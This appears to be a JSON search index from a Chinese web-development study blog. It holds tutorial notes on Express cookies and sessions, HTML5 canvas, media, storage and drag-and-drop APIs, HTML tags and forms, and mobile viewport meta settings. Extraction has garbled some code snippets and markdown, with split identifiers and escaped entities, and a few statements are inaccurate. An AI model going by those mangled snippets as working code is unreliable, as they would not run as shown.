res.write(&#x27;you posted:\\n&#x27;) res.end(JSON.stringify(req.body, null, 2))&#125;)\n\n十五、express中间件cookie的基本使用15.1 Cookie 简介\n15.2 Cookie 特点\ncookie 保存在浏览器本地\n正常设置的 cookie 是不加密的，用户可以自由看到;\n用户可以删除 cookie，或者禁用它\ncookie 可以被篡改\ncookie 可以用于攻击\ncookie 存储量很小。未来实际上要被 localStorage 替代，但是后者 IE9 兼容\n\n15.3 Cookie 的使用\n设置 cookie\nres.cookie(&#x27;rememberme&#x27;, &#x27;1&#x27;, &#123; maxAge: 900000, httpOnly: true &#125;)res.cookie(&#x27;name&#x27;, &#x27;tobi&#x27;, &#123; domain: &#x27;.example.com&#x27;, path: &#x27;/admin&#x27;, secure: true &#125;);res.cookie(&#x27;rememberme&#x27;, &#x27;1&#x27;, &#123; expires: new Date(Date.now() + 900000), httpOnly: true &#125;);\n\n获取 cookie\nreq.cookies.name\n\n删除 cookie\nres.cookie(&#x27;rememberme&#x27;, &#x27;&#x27;, &#123; expires: new Date(0)&#125;);res.cookie(&#x27;username&#x27;,&#x27;zhangsan&#x27;,&#123;domain:&#x27;.ccc.com&#x27;,maxAge:0,httpOnly:true&#125;);\n\n15.4 加密 Cookie1. 配置中间件的时候需要传参\nvar cookieParser = require(&#x27;cookie-parser&#x27;);app.use(cookieParser(&#x27;123456&#x27;));\n\n2. 设置 cookie 的时候配置 signed 属性\nres.c ookie(&#x27;userinfo&#x27;,&#x27;hahaha&#x27;,&#123;domain:&#x27;.c cc.c om&#x27;,maxAge :900000,httpOnly :true,signed :true&#125;)\n\n3. signedCookies 调用设置的 cookie\nconsole.log(req.signedCookies);\n\n十六、express中间件express-session常见参数配置使用16.1 Session 简单介绍\nsession 是另一种记录客户状态的机制，不同的是 Cookie保存在客户端浏览器中，而 session 保存在服务器上\n\nSession 的用途\n\nsession 运行在服务器端，当客户端第一次访问服务器时，可以将客户的登录信息保存\n当客户访问其他页面时，可以判断客户的登录状态，做出提示，相当于登录拦截\nsession 可以和 Redis或者数据库等结合做持久化操作，当服务器挂掉时也不会导致某些客户信息(购物车)丢失。\n\n16.2 Session 的工作流程\n当浏览器访问服务器并发送第一次请求时，服务器端会创建一个 session 对象，生成一个类似于 key,value 的键值对，然后将 key(cookie)返回到浏览器(客户)端，浏览器下次再访问时，携带 key(cookie)， 找到对应的 session(value)。 客户的信息都保存在 session 中\n\n16.3 express-session 的使用1. 安装 express-session\ncnpm install express-session --save\n\n2. 引入 express-session\nvar session = require(&quot;express-session&quot;);\n\n3. 设置官方文档提供的中间件\napp.use(session(&#123;    secret: &#x27;keyboard cat&#x27;,    resave: true,    saveUninitialized: true&#125;))\n\n4. 使用\n\n设置值 req.session.username = &quot;张三&quot;;\n获取值 req.session.username\n\n16.4 express-session 的常用参数app.use(session(&#123;    secret: &#x27;12345&#x27;,    name: &#x27;name&#x27;,    cookie: &#123;        maxAge: 60000    &#125;,    resave: false,    saveUninitialized: true&#125;));\n\n行加密的字符串.这个\n\n16.5 express-session 的常用方法req.session.destroy(function(err) &#123;    /*销毁 session*/&#125;) req.session.username = &#x27;张三&#x27;; //设置 session req.session.username //获取 session req.session.cookie.maxAge=0; //重新设置 cookie 的过期时间\n\n16.6 负载均衡配置 Session，把 Session 保存到数据库 里面\n需要安装express-session 和 connect-mongo模块\n引入模块\n\nvar session = require(&quot;express-session&quot;);const MongoStore = require(&#x27;connect-mongo&#x27;)(session);\n\n\n配置中间件\n\napp.use(session(&#123;    secret: &#x27;keyboard cat&#x27;,    resave: false,    saveUninitialized: true,    rolling:true,    cookie:&#123;        maxAge:100000    &#125;,    store: new MongoStore(&#123;        url: &#x27;mongodb://127.0.0.1:27017/student&#x27;,        touchAfter: 24 * 3600 // time period in seconds    &#125;)&#125;))\n\n16.7 Cookie 和 Session 区别\ncookie 数据存放在客户的浏览器上，session 数据放在服务器上\ncookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗 考虑到安全应当使用 session\nsession 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能 考虑到减轻服务器性能方面，应当使用 COOKIE\n单个 cookie 保存的数据不能超过 4K，很多浏览器都限制一个站点最多保存 20 个 cookie\n\n","categories":["后端"],"tags":["nodejs"]},{"title":"html-api","url":"/2018/01/26/html+css+js+ts/1-h5-api/","content":"一、Canvas API\ncanvas API是H5标准中最复杂的部分， 它提供几种属性和方法，可以在canvas元素上创建图形应用\n方法\n以下方法专门用于调用canvas API\n\ngetContext(context)创建可绘制图形的画布上下文，接受两个值，2d和3d\nfillRect(x,y,width,height)绘制实心矩形\nstrokeRect(x,y,width,height)绘制矩形轮廓\nclearRect(x,y,width,height)清除画布指定区域内容\ncreateLinearGradient(x1,y1,x2,y2)创建一个线性渐变效果\ncreateRadialGradient(x1,y1,r1,x2,y2,r2)创建一个放射渐变效果\naddColorStop(position,color)用于声明渐变颜色position范围是0.0-1.0 用于确定颜色开始变化位置\nbeginPath()开始一条新路径\nclosePath()在路径最后实现封闭该路径，它会生成一条直线，连接笔触的最后一个位置与路径的起点。如想要保持路径开放，使用fill()绘图，不用这个方法\nstroke() 用于创建路径轮廓\nfill()用于绘制实心形状\nclip()用于创建一个由路径定义的裁剪区域，只有在落入形状内的内容才绘制到画布上\nmoveTo(x,y)将虚拟笔触移到新位置，下一个方法会从改点的开始继续设置路径\nlineTo(x,y)在新路径上添加一条直线\nrect(x,y,width,height)在路径为(x,y)位置上添加width和height矩形\narc(x,y,radius,startAngle,endAngle,direction)在路径上添加一条弧线 ,x,y指定弧线的中心，角度单位为弧度，direction是一个表示顺时针或逆时针的布尔值。使用公式 Math.PI/180x角度，将角度转换为半径\nstrokeText(text,x,y,max) 直接在画布上绘制文字轮廓。可选参数，max声明文字最大尺寸\nfillText(text,x,y,max)直接在画布上绘制实心文字。可选参数，max声明文字最大尺寸\ntranslate(x,y)将画布原点移到点(x,y)处，原点（0,0）初始位置位于canvas所在区域的左上角\nrorate(angle)这个方法可以使画布原点为中心发生旋转，角度必须是弧度。使用公式Math.PI/180x 将角度转换为弧度\nscale(x,y) 改变画布比例 默认值是（1.0,1.0）这些值可以是负值\ntransform（m1,m2,m3,m4,dx,dy）修改画布的转换矩阵。新矩阵是基于之前的矩阵得到的\nsetTransform（m1,m2,m3,m4,dx,dy）修改画布的转换矩阵。重置之前的值，声明新的值\nsave()保存画布状态，包括转换矩阵、样式属性、裁剪遮罩\nrestore() 恢复上一次保存的状态\ndrawImage() 在画布上绘制图像\n\n属性\ncanvas API专用属性列表\n\nrect( x, y, width, height ) 绘制矩形\nfillRect( x, y, width, height ) 绘制被填充的矩形\nstrokeRect( x, y, width, height ) 绘制矩形（无填充）\nclearRect( x, y, width, height ) 清除指定的矩形内的像素\nfill() 填充当前绘图（路径）\nstroke()绘制已定义的路径\nbeginPath() 起始（重置）当前路径\nmoveTo( x, y ) 将笔触移动到指定的坐标(x,y)\nlineTo( x, y ) 绘制一条从当前位置到指定的坐标(x,y)的直线\nclip() 从原始画布剪切任意形状和尺寸的区域\nquadraticCurveTo() 创建二次贝塞尔曲线\nbezierCurveTo() 创建三次贝塞尔曲线\narc( x, y, radius, startAngle, endAngle, anticlockwise) 绘制圆或圆弧\narcTo( x1, y1, x2, y2, radius) 根据给定点画圆弧，再以直线连接两个点\nisPointInPath( x, y ) 检测指定的点是否在当前路径中，在则返回true。\nfillStyle 设置或返回用于填充绘画的颜色、渐变或模式\nstrokeStyle 设置或返回用于笔触的颜色、渐变或模式\nshadowColor 设置或返回用于阴影的颜色\nshadowBlur 设置或返回用于阴影的模糊级别\nshadowOffsetX 设置或返回阴影与形状的水平距离\nshadowOffsetY 设置或返回阴影与形状的垂直距离\nlineCap 设置或返回线条的结束点样式（butt、round、square）\nlineJoin 设置或返回当两条线交汇时，边角的类型（bevel、round、miter）\nlineWidth 设置或返回当前的线条宽度\nmiterLimit 设置或返回最大斜接长度\ncreateLinearGradient( x0, y0, x1, y1 ) 创建线性渐变\ncreatePattern( image/canvas/video, repeat ) 在指定的方向内重复绘制指定的元素\ncreateRadialGradient( x0, y0, r0, x1, y1, r1 )创建径向渐变\naddColorStop( stop, color ) 规定渐变对象中的颜色和停止位置\nfont 设置或返回文本内容的当前字体属性（和css的font一样）\ntextAlign 设置或返回文本内容的当前对齐方式\ntextBaseline 设置或返回在绘制文本时使用的当前文本基线\nfillText( text, x, y ) 在画布上绘制“被填充”的文本\nstrokeText( text, x, y ) 在画布上绘制文本（无填充）\nmeasureText( text ) 返回包含指定文本宽度的对象（属性width获取宽度）\ndrawImage( image/canvas, x, y )、drawImage( image&#x2F;canvas, x, y, width, height )、drawImage( image&#x2F;canvas, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight )&#96; 在画布上绘制图像、画布或视频\ncreateImageData( width, height )、createImageData(imageData) 绘制ImageData对象\ngetImageData( x, y, width, height ) 返回ImageData对象，该对象为画布上指定的矩形复制像素数据。\nputImageData( ImageData, x, y )、putImageData( imageData, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight ) 把图像数据放回画布上。\nwidth 返回ImageData对象的宽度\nheight 返回ImageData对象的高度\ndata 返回一个对象，包含指定的ImageData对象的图像数据\nglobalAlpha 设置或返回绘图的当前alpha或透明度\nglobalCompositeOperation 设置或返回新图像如何绘制到已有的图像上。\nscale( x, y ) 缩放当前绘图\ntranslate( x, y ) 重新设置画布上的(0,0)位置\nrotate( angle ) 选择当前绘图，单位为“弧度”，角度转弧度公式（ degrees*Math.PI/180）\ntransform( m11, m12, m21, m22, dx, dy ) 替换绘图的当前转换矩阵\nsetTransform() 将当前转换重置为单元矩阵，然后运行transform()\nsave() 保存当前环境的状态\nrestore() 恢复之前保存过的路径状态和属性\ngetContext(&#39;2d&#39;) 获取2d对象\ntoDataURL() 将canvas转换成图片，返回地址\n\ncanvas常用总结\n\n标签\n&lt;canvas&gt;\n\n\n不支持canvas 的浏览器可以看到的内容\n\n\n&lt;canvas&gt;\n  绘制环境  - `getContext(&quot;2d&quot;)`;目前支持`2d`的场景- 绘制矩形  - `rect(L,T,W,H)`:创建一个矩形  - `fillRect(L,T,W,H)`:绘制填充的矩形  - ```    strokeRect(L,T,W,H)\n\n  绘制矩形(无填充)\n\n  - 默认一像素黑色边框\n\n\n设置绘图\n\nfillStyle:填充颜色(绘制canvas是有顺序的)\nlineWidth:线宽度，笔迹粗细\nstrokeStyle:边线颜色\n\n\n绘制路径\n\nstroke ：绘制，划线(黑色默认)\nfill :填充(黑色默认)\nrect(矩形区域)\nclearRect 擦除一个矩形区域\nsave 进入到XXX（高逼格）状态\nrestore 退出xxx（高逼格）状态\n\n\n绘制圆形\n\narc(x,y,半径,起始弧度,结束弧度,旋转方向)\nx，y起始位置\n弧度与角度：弧度=角度 x π / 180\n旋转方向：顺时针（默认：false），逆时针（true）\n\n\n绘制字体\n\nfont：设置字体大小\nfillText：填充字体\nstrokeText：绘制字体\n\n\n\n二、视频音频\n\n视频音频格式的简单介绍\n\n常见的视频格式\n视频的组成部分：画面、音频、编码格式\n视频编码：H.264、Theora、VP8(google开源)\n\n\n常见的音频格式\n视频编码：ACC、MP3、Vorbis\n\n\n\n\nHTML5能在完全脱离插件的情况下播放音视频,但是不是所有格式都支持。\n\n支持的视频格式：\n\nOgg=带有Theora视频编码+Vorbis音频编码的Ogg文件\nMEPG4=带有H.264视频编码+AAC音频编码的MPEG4文件\nWebM=带有VP8视频编码+Vorbis音频编码的WebM格式\n\n\n\nVideo的使用\n\n单独用法\n&#96;&#96;\n\n\n带提示用法\n\n&lt; video src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;\t您的浏览器暂不支持video标签。播放视频&lt;/ video &gt;\n\n\n兼容用法\n\n&lt; video  controls=&quot;controls&quot;  width=&quot;300&quot;&gt;\t&lt;source src=&quot;move.ogg&quot; type=&quot;video/ogg&quot; &gt;\t&lt;source src=&quot;move.mp4&quot; type=&quot;video/mp4&quot; &gt;\t您的浏览器暂不支持video标签。播放视频&lt;/ video &gt;\n\n\nVideo的常见属性\n\n\n\n\n属性\n值\n描述\n\n\n\nAutoplay\nAutoplay\n视频就绪自动播放\n\n\ncontrols\ncontrols\n向用户显示播放控件\n\n\nWidth\nPixels(像素)\n设置播放器宽度\n\n\nHeight\nPixels(像素)\n设置播放器高度\n\n\nLoop\nLoop\n播放完是否继续播放该视频，循环播放\n\n\nPreload\nload{auto,meta,none}\n规定是否预加载视频。\n\n\nSrc\nurl\n视频url地址\n\n\nPoster\nImgurl\n加载等待的画面图片\n\n\nAutobuffer\nAutobuffer\n设置为浏览器缓冲方式，不设置autoply才有效\n\n\n\nVideo的API方法\n\n\n\n\n方法\n属性\n事件\n\n\n\nplay()\ncurrentSrc\nplay\n\n\npause()\ncurrentTime\npause\n\n\nload()\nvideoWidth\nprogress\n\n\ncanPlayType()\nvideoHeight\nerror\n\n\n三、地理信息与本地存储\n地理位置\n\n经度 : 南北极的连接线\n\n纬度 : 东西连接的线\n\n位置信息从何而来\n\nIP地址\nGPS全球定位系统\nWi-Fi无线网络\n基站\n\n\navigator.geolocation\n\n单次定位请求 ：getCurrentPosition(请求成功,请求失败,数据收集方式)\n\n请求成功函数\n\n经度 : coords.longitude\n纬度 : coords.latitude\n准确度 : coords.accuracy\n海拔 : coords.altitude\n海拔准确度 : coords.altitudeAcuracy\n行进方向 : coords.heading\n地面速度 : coords.speed\n请求的时间: new Date(position.timestamp)\n\n\n请求失败函数\n\n失败编号 ：\ncode\n\n\n0 : 不包括其他错误编号中的错误\n1 : 用户拒绝浏览器获取位置信息\n2 : 尝试获取用户信息，但失败了\n3 : 设置了timeout值，获取位置超时了\n\n\n\n\n数据收集 : json的形式\n\nenableHighAcuracy : 更精确的查找，默认false\ntimeout : 获取位置允许最长时间，默认infinity\nmaximumAge : 位置可以缓存的最大时间，默认0\n\n\n多次定位请求* : watchPosition\n\n移动设备有用，位置改变才会触发\n配置参数：frequency 更新的频率\n关闭更新请求 : clearWatch\n\n\n百度地图API\n\n\n\n\n&lt;script src=&quot;http://api.map.baidu.com/api?v=2.0&amp;ak=qZfInp9MaT9Qa0PoNy4Rmx3Y9W9ZXMfw&quot;&gt;&lt;/script&gt;\n\n本地存储\n\nStorage\n\n&#96;&#96;&#96;sessionStorage  - `session`临时回话，从页面打开到页面关闭的时间段  - 窗口的临时存储，页面关闭，本地存储消失- ```  localStorage\n\n\n永久存储（可以手动删除数据）\n\n\n\n\nStorage的特点\n\n存储量限制 ( 5M )\n客户端完成，不会请求服务器处理\nsessionStorage数据是不共享、 localStorage共享\n\n\nStorage API\n\nsetItem()\n  :  - 设置数据，(`key`,`value`)类型，类型都是字符串  - 可以用获取属性的形式操作- ```  getItem():\n\n- 获取数据，通过`key`来获取到相应的`value`\n\n\n&#96;&#96;&#96;removeItem()\n  :  - 删除数据，通过key来删除相应的`value`- ```  clear()\n\n:\n\n删除全部存储的值\n\n\n\n\n存储事件:\n\n当数据有修改或删除的情况下，就会触发storage事件\n在对数据进行改变的窗口对象上是不会触发的&#96;\nKey : 修改或删除的key值，如果调用clear(),key为null\nnewValue : 新设置的值，如果调用removeStorage(),key为null\noldValue : 调用改变前的value值\nstorageArea : 当前的storage对象\nurl : 触发该脚本变化的文档的url\n注：session同窗口才可以,例子：iframe操作\n\n\n\n四、HTML5拖拽\n\n图片自带拖拽功能\n\n其他元素可设置draggable属性\n\ndraggable ：true\n\n拖拽元素(被拖拽元素对象)事件 :\n\nondragstart : 拖拽前触发\nondrag :拖拽前、拖拽结束之间，连续触发\nondragend :拖拽结束触发\n\n\n目标元素(拖拽元素被拖到的对象)事件 :\n\nondragenter :进入目标元素触发\n\nondragover:进入目标、离开目标之间，连续触发\n\nondragleave :离开目标元素触发\n\n&#96;&#96;&#96;ondrop\n             :在目标元素上释放鼠标触发      - 需要在`ondragover`事件里面阻止默认事件- 拖拽兼容问题  - 火狐浏览器下需设置`dataTransfer`对象才可以拖拽除图片外的其他标签    - `dataTransfer`对象    - `setData()` : 设置数据 `key`和`value`(必须是字符串)    - `getData()` : 获取数据，根据`key`值，获取对应的`value`    - `effectAllowed` : 设置光标样式(`none`, `copy`, `copyLink`, `copyMove`, `link`, `linkMove`,`move`, `all` 和`uninitialized`)    - `setDragImage` ：三个参数（指定的元素，坐标`X`，坐标`Y`）    - ```      files\n\n： 获取外部拖拽的文件，返回一个\nfilesList\n\n列表\n\nfilesList下有个type属性，返回文件的类型\n\n\n\n\n\n\n读取文件信息\n\n&#96;&#96;&#96;FileReader\n    (读取文件信息)    - `readAsDataURL`  - 参数为要读取的文件对象    - `onload`当读取文件成功完成的时候触发此事件    - `this. result` 获取读取的文件数据### 五、跨文档操作------- 跨文档请求- 同域跨文档  - ```    iframe\n\n内页：\n\n父页面操作子页面：contentWindow\n子页面操作父页面：window.top(找到最顶级的父页面)&#x2F;parent(第一父页面)\n新窗口页：\n父页面操作子页面：window.open\n子页面操作父页面：window.opener\n\n\n\n\n\n\n不同域跨文档\n\n&#96;&#96;&#96;postMessage（“发送的数据”,”接收的域”）\n    - `message`事件监听    - `ev.origin`发送数据来源的域    - `ev.data` 发送的数据  - 通过判断发送的数据来执行相应的需求- ajax跨域  - `XMLHttpRequest` 新增功能    - 跨域请求：修改服务端头信息      - I`E`兼容：`XDomaiRequest`  - 进度事件：    - ```      upload.onprogress(ev)\n\n  上传进度(实现文件上传进度条)\n\nev.total 发送文件的总量\n\nev.loaded 已发送的量\n\nFormData 构建提交二进制数据\n\n\n\n\n\n\n","categories":["前端"],"tags":["html"]},{"title":"html-tag","url":"/2018/01/10/html+css+js+ts/1-html-tag/","content":"第二章 html基本结构\n\n认识HTML：\nhtml不是一种编程语言，是一种标志语言\n标记语言是由一套标识标签组成的\nhtml使用标签来描述网页\n\n\nhtml结构：\n\n&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n不成对出现的标签       \n\nHTML 基本标签的讲解：\n\n  &#96;&#96;标签\n\n—-仅仅用于标题文本，不要为了产生粗体文本使用它们\n\n&#96;&#96;标签 段落标签\n\n&#96;&#96;标签\n\n都会让文字产生加粗效果\n\n&#96;&#96;用于强调文本，强度更深，表示重要文本—&gt;用于SEO优化\n&#96;&#96;只是视觉加粗效果—&gt;单纯为了产生加粗\n\n\n&lt;em&gt;\n\n&lt;i&gt;\n        标签    - `em`用于强调文本    - `i`只是视觉斜体效果    - ``比``强调更强      - 特殊符号：    - `&amp;nbsp`; —-&gt;空格    - `&amp;gt`; —&gt;大于号    - `&amp;lt`；—&gt;小于号    - `&amp;quot`；—&gt;引号    - `&amp;copy`;–&gt;版权号------#### 第三章 html基本标签------- `HTMl`基本标签：  - ```    span\n\n标签\n\n- 对被用来组合文档中的行内元素\n- 注意：span没有固定的格式表现，当对它应用样式时，才会产生视觉上的变化\n\n\n&#96;&#96;&#96;\n\n  标签  - 文字的格式按源码的排版来显示，我们称之为预处理格式- &lt;a&gt;标签—&gt;他有一个必不可少的属性 href- 创建锚点和锚链接  - 锚点也是一种超链接，是页面内进行跳转的超链接    - 第一步：创建锚点 ``    - 第二步：使用创建好的锚点名称 `[内容](#锚点名称)`- ```  marquee\n\n标签\n\n- 可以创建一个内容滚动效果\n\n\n\n&lt;marquee direction=&quot;down&quot; loop=&quot;4&quot; onmouseover=this.stop() onmouseout=this.start()&gt;&lt;/marquee&gt;\n\n\ndirection 表示滚动方向，取值有（left,right,up,down,默认left）\nloop表示滚动循环的次数，默认为无限循环\n\nonmouseover=this.stop()  onmouseover=this.start()  scrollamout=&quot;1&quot;(滚动速度)\n\n\n表示当鼠标移上区域的时候停止滚动，鼠标移开继续滚动\n\n\n第四章 img图片标签与路径\n\n图片标签与路径：\n\n常见图片格式 jpg png gif\nGif （只支持全透明）\nJpeg &#x2F;jpg\nPng 半&#x2F;全透明都支持\n\n\n图片标签写法 ：\n\n&#96;&#96;\n\n\n图片四要素：\n\nsrc=&quot;&quot; 图片路径\nalt=&quot;&quot; 图片含义\nwidth=&quot;&quot; 图片宽度 和图片大小保持一致\nheight=&quot;&quot; 图片高度 和图片大小保持一致\ntitle=&quot;&quot;\n\n\n路径知识：\n\n相对路径、绝对路径：\n相对路径：(Relative Path) 相对于该文件的路径；\n绝对路径：(Absolute Path) 从磁盘出发的路径；\n\n\n&lt;img src&#x3D;”” …… align&#x3D;”” &#x2F;&gt; align属性–设置图片与后面文字的位置关系值–top、bottom、middle、absmiddle、left、right\n\n\n在静态页面中：\n\n/开头表示根目录；\n\n./表示当前目录；（斜画线前面一个点）\n\n../上级目录；（斜画线前面两个点）\n\n直接用文件名不带&#x2F;也表示同一目录\n\n这些都是相对于当前文件的位置来说的，如果用绝对路径的话就是写全了。\n\n\n\n\n\n第五章 三种列表的讲解\n\n三种列表的知识讲解：\n\n&#96;&#96;&#96;\n无序列表- 无序列表是一个没有顺序项目的列表，此列表项默认粗体圆点进行标识\n\n\n\n\n   \n   \n   \n\n- 1. 有序列表  2. - 有序列表也是一列项目，只是列表项目使用的是数字进行标记。 有序列表始于 `` 标签。每个列表项始于 ``标签。\n\n   内容一\n   内容二\n   内容三\n\n- 列表符号  - 无序列表-列表符号:    - `type=&quot;circle&quot;` 空心圆 `type=“disc”` 实心圆 默认值 `type=&quot;square&quot;` 方块符  - 有序列表-列表符号    - `type=&quot;A&quot;` A B C D    - `type=&quot;a&quot;` a b c d    - `type=&quot;1&quot;` 1 2 3 4 默认值type=”I” I II III type=”i” i ii iii  - 列表嵌套  - 无序列表-嵌套\n\n 柚子\n  \n   沙田柚\n   蜜柚\n  \n \n 荔枝\n 苹果\n- 有序列表-嵌套\n\n 茶\n  \n   红茶\n   绿茶\n  \n \n 果汁\n 牛奶\n- 定义列表  - 定义列表不仅仅是一列项目，而是项目及其注释的组合。定义列表以 `` 标签开始。每个定义列表项以 ``开始。每个自定义列表项的定义以 `` 开始。\n  \n     pc网页制作  \n     学习DIV+CSS JS JQ 项目实战  \n     手机网页制作  \n     手机网页制作实战\n\n- `dd`是对`dt`的解释  - `&lt; dl&gt;&lt; /dl&gt;`用来创建一个普通的列表,  - `&lt; dt&gt;&lt; /dt&gt;`用来创建列表中的上层项目，  - `&lt; dd&gt;&lt; /dd&gt;`用来创建列表中最下层项目，  - `&lt; dt&gt;&lt; /dt&gt;`和`&lt; dd&gt;&lt; /dd&gt;`都必须放在`&lt; dl&gt;&lt; /dl&gt;`标志对之间。\n\n    中国城市\n    北京 \n    上海 \n    广州 \n    美国城市\n    华盛顿 \n    芝加哥 \n    纽约 \n\n- `dl`是d`efinition list`的缩写- `dt`是`definition title`的缩写- `dd`是d`efinition description`的缩写- `list-style`属性具有三个属性分量：- `list-style-position` ：设置列表项图标的位置，位于文本内或者文本外- `list-style-type`： 设置列表项图标的类型- `list-style-image`：使用图像设置列表项图标------#### 第六章 表单元素(上)------- 表单标签:  - ``表单标签    - ```      &lt;form&gt;\n\n  表单是一个包含表单元素的区域，包括起来的都是表单的内容\n\n  &lt;form&gt; &lt;input type=&quot;text&quot;/&gt;&lt;/form&gt;\n\n\nHTML标签 - Action和确认按钮：\n\n当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。\n\n\n\n&lt;form action=&quot;html.do&quot; method=&quot;get&quot;&gt;            username:  &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;           &lt;input type=&quot;submit&quot; value=&quot;提  交&quot; /&gt;&lt;/form&gt;\n\n\nHTML标签 - 隐藏域隐藏标签：\n隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器\n\n&lt;form&gt;             &lt;input type=&quot;hidden&quot; name=&quot;hid&quot; value=&quot;value&quot;&gt;&lt;/form&gt;\n\n\n&#96;&#96;标签的掌握\n\n常用type类型：\n&#96;&#96;\ntype=&quot;text&quot; 单行文本输入框\ntype=&quot;password&quot; 密码（maxlength=&quot;&quot;）\ntype=&quot;radio&quot; 单项选择（checked=&quot;checked&quot;）\ntype=&quot;checkbox&quot; 多项选择\ntype=&quot;button&quot; 按钮\ntype=&quot;submit&quot; 提交 type=&quot;image&quot;图片提交\ntype=&quot;file&quot; 上传文件\ntype=&quot;reset&quot;重置\ntype=&quot;hidden&quot; 隐藏\n\n\n\n\n关于表单中的设置默认值：\n&lt;input type=&quot;text&quot; name=&quot;&quot; value=&quot;今天心情不错&quot; /&gt;&lt;input type=&quot;radio&quot; name=&quot;&quot; value=&quot;&quot; checked=&quot;checked&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot; checked=&quot;checked&quot;&gt;\n\n&lt;select name=&quot;&quot; &gt; &lt;option  value=&quot;&quot;&gt;&lt;/option&gt; &lt;option  value=&quot;&quot; selected=&quot;selected&quot;&gt;&lt;/option&gt;&lt;select&gt;\n\n\ntextarea没有默认值\n\n&#96;&#96;标签的使用\n\n&#96;&#96;\n\nlabel 元素不会向用户呈现任何特殊效果。\n不过，它为鼠标用户改进了可用性。\n如果您在 label 元素内点击文本，就会触发此控件。\n就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。\n\n\n&#96;&#96; 标签的for 属性应当与相关元素的 id属性相同。\n\n例子：（重要—注册表单–用户体验–必做）\n&lt;p&gt;单向选择&lt;/p&gt;&lt;label for=&quot;male&quot;&gt;男：&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; id=&quot;male&quot;/&gt;&lt;label for=&quot;nv&quot;&gt;女：&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;checked=&quot;check&quot;/&gt;\n\n\n\n\n第七章 表单和表格(下)\n\n表单和表格标签：\n\n&#96;&#96;文本域标签\n&#96;&#96;标签：\n&#96;&#96;是文本域标签，可以在其中插入一段文字内容，它有两个常用属性rows和cols\n\n\n注意：\n\nrows表示这个文本域有多少行\ncols表示这个文本域有多少列\n\n\n除了这两个属性它还有readonly（只读，文本域的内容无法改变，相当于协议）和title（鼠标放上提示）\n\n&#96;&#96;标签的掌握\n\n注：当提交表单时，浏览器会提交选定的项目，或者收集用逗号分隔的多个选项，将其合成一个单独的参数列表，并且在将\n&lt;select&gt;\n\n表单数据提交给服务器时包括\nname\n\n属性\n&lt;form&gt;          &lt;select name=&quot;&quot;  id=&quot;&quot;&gt;         &lt;option value=&quot;1&quot;&gt;1月&lt;/option&gt;            &lt;option value=&quot;2&quot;&gt;2月&lt;/option&gt;      &lt;/select&gt;&lt;/form&gt;\n\n\n常用到的属性：disabled=“disabled” name=&quot;sel&quot; size=&quot;2&quot;\n\n&#96;&#96;表格标签\n\n表格标签：是表格标签，可以用它定义一个表格。\n注意：&#96;&#96;的border属性不能少\n\n&#96;标签的使用\n\n行标签：\n\n可以定义表格中的一行，一个&lt;tr&gt;表示一行。\n\n\n\n&lt;table border=&quot;1&quot;&gt;&lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;性别&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;性别&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n\n\n&#96;单元格标签:\n\n&lt;td&gt;\n可以定义表格中的一个单元格，\n&lt;td&gt;&lt;/td&gt;\n表示一个单元格。\n&lt;table border=&quot;1&quot;&gt;\n&lt;tr&gt;\n&lt;td &gt;姓名&lt;/td&gt;\n&lt;td&gt;性别&lt;/td&gt;\n&lt;td&gt;爱好&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n\n\nborder-collapse 属性设置是否将表格边框折叠为单一边框：\n\nborder-collapse:collapse;\n\ncolspan左右合并\n\nrowspan上下合并\n\n\n\n\n第一部分总结：\n\n非可视化标签：head meta style scrpit...\n\n可视化标签：img div span a ul li…\n\n只有可视化标签，才能用css改变它\n\n单标签：meta link base img input br hr\n\n双标签：html head body div a p span ..ul li ol dl ….\n\n常用可视化标签\n\ndiv\n\n一般用它来布局\n\n\na\n超链接标签\n\nhref*属性：设置跳转的网页地址\ntarget属性：设置跳转的目标\n结论：凡事页面可以点击跳转或者表单提交的文字，都用a标签\n\n\nimg\n\nsrc*属性用来设置图片的url数据\nalt提供给搜索引擎搜索的\nwidth\nheight\n结论 ：显示图片\n\n\nul li\n\n列表\n结论：只要将来设计页面中有固定样式的列表，就用ul和li\n\n\ntable caption tr td (th)\n\n慢慢已经被淘汰了 被ul li代替\n如果是合并竖排的就是合并行（rowspan）\n如果是合并横排的就是合并列（colspan）\n\n\n\n\n\n","categories":["前端"],"tags":["html"]},{"title":"移动端像素比调试","url":"/2018/02/07/html+css+js+ts/1-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D/","content":"\n物理像素:移动端设备的分辨率\n独立像素:css的像素 320 375\n像素比 &#x3D; 物理像素&#x2F;独立像素\n\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;&gt;\n\n\nwidth=device-width 设备宽度 640px(低版本的安卓手机不支持数字) 这个属性在不支持IE\ninitial-scale=1.0(初始缩放比),能够起到和width=device-width相同的效果(把理想的视窗设置为设备的宽度) 两个配合使用就能够很好的解决移动端各设备的适配问题\nmaximum-scale=1.0最大缩放比例\nuser-scalable=0禁止缩放\nminimum-scale=1.0 最小缩放比例\n\n移动端布局方法\n\n1、流式布局 与设备等宽 做自适应 100%或者具体的像素值\n2、rem做盒子的宽度，viewport缩放\n3、固定宽度 viewport缩放content=&quot;width=640, 